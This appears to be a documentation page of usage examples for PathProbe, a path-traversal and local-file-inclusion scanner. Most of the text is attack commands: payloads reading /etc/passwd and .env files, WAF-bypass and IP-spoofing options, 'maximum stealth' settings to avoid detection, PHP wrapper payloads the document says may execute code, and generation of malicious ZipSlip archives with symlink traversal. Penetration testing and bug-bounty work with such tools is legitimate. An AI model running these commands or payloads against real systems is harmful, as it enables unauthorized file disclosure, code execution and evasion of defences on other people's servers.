# Extended Usage Examples

This document covers advanced scenarios, workflow patterns, and real-world testing strategies.

---

## Table of Contents

1. [Basic Workflow](#basic-workflow)
2. [Parameter Discovery](#parameter-discovery)
3. [POST Body Testing](#post-body-testing)
4. [WAF Evasion Strategies](#waf-evasion-strategies)
5. [PHP LFI Testing](#php-lfi-testing)
6. [ZipSlip Testing](#zipslip-testing)
7. [Integration with Other Tools](#integration-with-other-tools)
8. [Performance Tuning](#performance-tuning)
9. [Reading Results](#reading-results)

---

## Basic Workflow

### Step 1: Identify Target Parameters

Before scanning, identify which parameters might handle file paths. Look for:
- Download endpoints: `/download?file=report.pdf`
- Template loading: `/page?template=contact`
- Image serving: `/img?src=logo.png`
- Document viewing: `/view?doc=guide.html`

### Step 2: Run Discovery Scan

```bash
# Quick scan with verbose output to understand the target
python -m pathprobe "http://target.com/download?file=test.pdf" -p file -v
```

### Step 3: Escalate if Hits Found

```bash
# If discovery finds something, run aggressive mode
python -m pathprobe "http://target.com/download?file=test.pdf" \
    -p file \
    --aggressive \
    --waf-bypass all \
    --report all
```

---

## Parameter Discovery

### Auto-Crawl + Discover

Let PathProbe find parameters automatically:

```bash
python -m pathprobe "http://target.com" \
    --crawl 3 \
    --max-urls 500 \
    -v
```

PathProbe will:
1. BFS-crawl up to depth 3
2. Extract parameters from query strings, forms, and JSON responses
3. Score each parameter (value-based + behavioral probing)
4. Only fuzz HIGH and MEDIUM priority parameters

### Manual Multi-Parameter Scan

```bash
python -m pathprobe "http://target.com/api" \
    -p file,path,doc,template,page,load,view,src,img,name,resource
```

---

## POST Body Testing

### JSON API

```bash
python -m pathprobe "http://api.target.com/v2/documents/read" \
    -p document_path \
    -m POST \
    --post-mode json \
    --json-template '{"action":"read","user_id":123}'
```

The tool injects the payload into the `document_path` field while preserving other JSON fields.

### Nested JSON Path

Use dot notation for nested objects:

```bash
python -m pathprobe "http://api.target.com/config" \
    -p settings.template.path \
    -m POST \
    --post-mode json
```

This produces: `{"settings": {"template": {"path": "../../../etc/passwd"}}}`

### XML Body

```bash
python -m pathprobe "http://target.com/xmlapi" \
    -p filename \
    -m POST \
    --post-mode xml
```

### Multipart File Upload

```bash
# Inject into form field value
python -m pathprobe "http://target.com/upload" \
    -p file \
    -m POST \
    --post-mode multipart

# Inject into filename header (tests upload path handling)
python -m pathprobe "http://target.com/upload" \
    -p file \
    -m POST \
    --post-mode multipart \
    --filename-inject
```

### All POST Formats at Once

```bash
python -m pathprobe "http://target.com/endpoint" \
    -p file \
    -m BOTH \
    --post-mode all
```

---

## WAF Evasion Strategies

### Strategy 1: Start Light, Escalate

```bash
# First: test without WAF bypass
python -m pathprobe "http://target.com/read?file=test" -p file -v

# If blocked: try individual techniques
python -m pathprobe "http://target.com/read?file=test" -p file \
    --waf-bypass semicolon -v

# If still blocked: try all + IP spoofing
python -m pathprobe "http://target.com/read?file=test" -p file \
    --waf-bypass all --waf-ip-spoof -v
```

### Strategy 2: Target-Specific Bypass

```bash
# Tomcat/Jetty: semicolon bypass
python -m pathprobe "http://tomcat-app.com/view?f=index" -p f \
    --waf-bypass semicolon

# IIS: try overlong UTF-8 and double_slash
python -m pathprobe "http://iis-app.com/get?path=doc" -p path \
    --waf-bypass overlong_dot,double_slash

# Generic: null bytes + path comments
python -m pathprobe "http://target.com/load?tpl=main" -p tpl \
    --waf-bypass insert_null,path_comment
```

### Strategy 3: Slow and Steady

```bash
# Rate-limited to avoid detection
python -m pathprobe "http://target.com/page?f=home" -p f \
    --waf-bypass all \
    --waf-ip-spoof \
    --rate 2 \
    --threads 1
```

---

## PHP LFI Testing

### Source Code Disclosure

```bash
# php://filter to read source as base64
python -m pathprobe "http://php-app.com/index.php?page=home" \
    -p page -v
```

PathProbe includes `php://filter/convert.base64-encode/resource=` payloads by default. If the response contains base64-encoded PHP source, detection is automatic (Layer 4: Base64 PHP Detection).

### Aggressive Mode (Write Primitives)

```bash
# WARNING: These payloads may execute code on the target
python -m pathprobe "http://php-app.com/index.php?page=home" \
    -p page \
    --aggressive
```

This adds `php://input`, `data://`, and `expect://` payloads.

---

## ZipSlip Testing

### Generate Malicious Archives

```bash
# Generate malicious ZIP (for manual testing via Burp, etc.)
python -m pathprobe "http://any.com" --zipslip-generate malicious.zip

# Generate malicious TAR.GZ (with symlink traversal)
python -m pathprobe "http://any.com" --zipslip-generate malicious.tar.gz
```

Archive contents:
- `../../../pathprobe_canary.txt` (forward-slash traversal)
- `..\..\..\pathprobe_canary.txt` (backslash traversal)
- `/tmp/pathprobe_canary.txt` (absolute path)
- `link_to_etc → ../../../etc/passwd` (TAR symlink)

---

## Integration with Other Tools

### With Burp Suite

1. Run PathProbe scan, export JSON report:
   ```bash
   python -m pathprobe "http://target.com/api" -p file --report json
   ```
2. Use the `curl_poc` field from JSON findings to replay in Burp Repeater

### With Custom Wordlists (SecLists, etc.)

```bash
python -m pathprobe "http://target.com/read?f=doc" -p f \
    --wordlist /path/to/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
```

### Pipe URLs from Other Tools

```bash
# Use with tools like waybackurls, gau, etc.
# First crawl with PathProbe:
python -m pathprobe "http://target.com" --crawl 5 -p file,path,doc
```

---

## Performance Tuning

### Fast Scan (Local Network / Lab)

```bash
python -m pathprobe "http://local-dvwa.com/vuln/fi/?page=include.php" \
    -p page \
    --threads 50 \
    --no-verify \
    --timeout 5
```

### Careful Scan (Production / Bug Bounty)

```bash
python -m pathprobe "http://target.com/page?f=home" \
    -p f \
    --threads 5 \
    --rate 3 \
    --timeout 15 \
    --retries 3
```

### Maximum Stealth

```bash
python -m pathprobe "http://target.com/page?f=home" \
    -p f \
    --threads 1 \
    --rate 1 \
    --waf-ip-spoof
```

---

## Reading Results

### Console Output

```
  [VULN] CRITICAL  [85/100] [✓]  param=file  ../../../etc/passwd
         ↳ /etc/passwd exposed (OS: Linux)
         ↳ /etc/passwd structure detected (3+ valid entries)
```

- **Score**: 0–100 confidence (higher = more reliable)
- **[✓]**: Verified by re-testing (low false positive risk)
- **[?]**: Unverified (might be dynamic page noise)

### Score Interpretation

| Score | Meaning | Action |
|-------|---------|--------|
| 80-100 | Almost certainly vulnerable | Report immediately |
| 60-79 | Likely vulnerable | Verify manually, then report |
| 40-59 | Possibly vulnerable | Investigate further |
| 20-39 | Weak signal | Probably false positive |
| 0-19 | Very weak | Likely noise |

### Top Findings Table

```
  [ 95] CRITICAL ████████████████████  ✓ param=file  ../../../etc/passwd
  [ 72] HIGH     ██████████████░░░░░░  ✓ param=doc   ../../.env
  [ 35] MEDIUM   ███████░░░░░░░░░░░░░  ? param=q     size anomaly
```

Findings are always sorted by score, most likely vulnerabilities first.
